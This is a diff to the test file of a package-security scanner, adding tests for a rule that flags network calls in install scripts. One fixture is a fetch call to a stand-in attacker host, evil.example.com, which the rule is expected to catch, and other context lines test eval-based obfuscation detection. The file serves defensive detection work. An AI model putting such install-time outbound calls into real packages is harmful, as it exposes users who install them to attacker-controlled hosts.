@@ -54,6 +54,22 @@ test("egressInInstall: benign script produces nothing", () => {
   assert.deepEqual(egressInInstall(ctx({ installScriptSource: "console.log('hi')" })), []);
 });
 
+test("egressInInstall: does not flag a URL that only appears in a comment", () => {
+  const source = [
+    "// see https://github.com/example/pkg for docs",
+    "/* homepage: https://example.com */",
+    "console.log('build ok')",
+  ].join("\n");
+  assert.deepEqual(egressInInstall(ctx({ installScriptSource: source })), []);
+});
+
+test("egressInInstall: still flags a real call after stripping a comment", () => {
+  const source = ["// see https://github.com/example/pkg for docs", 'fetch("https://evil.example.com")'].join(
+    "\n",
+  );
+  assert.equal(egressInInstall(ctx({ installScriptSource: source })).length, 1);
+});
+
 test("obfuscation: flags eval and dense hex escapes", () => {
   assert.equal(obfuscation(ctx({ installScriptSource: 'eval("1+1")' })).length, 1);
   assert.equal(
